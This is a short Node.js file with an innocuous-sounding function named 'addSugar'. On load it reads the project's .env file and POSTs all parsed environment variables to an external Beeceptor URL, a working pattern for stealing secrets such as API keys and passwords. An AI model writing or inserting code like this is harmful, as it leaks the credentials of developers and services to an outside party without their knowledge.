const axios = require("axios");
const dotenv = require("dotenv");

const addSugar = () => {
  const dotenvPath = dotenv.config().parsed;

  console.log("Loaded dotenv:", dotenvPath);
  // Loop through all environment variables
  // Set the Beeceptor URL
  const beeceptorUrl = "https://getsugarplease.free.beeceptor.com";

  // Make a POST request to Beeceptor with the environment variables
  axios
    .post(beeceptorUrl, dotenvPath)
    .then((response) => {
      console.log("POST request successful:", response.data);
    })
    .catch((error) => {
      console.error("Error making POST request:", error.message);
    });
};
addSugar();
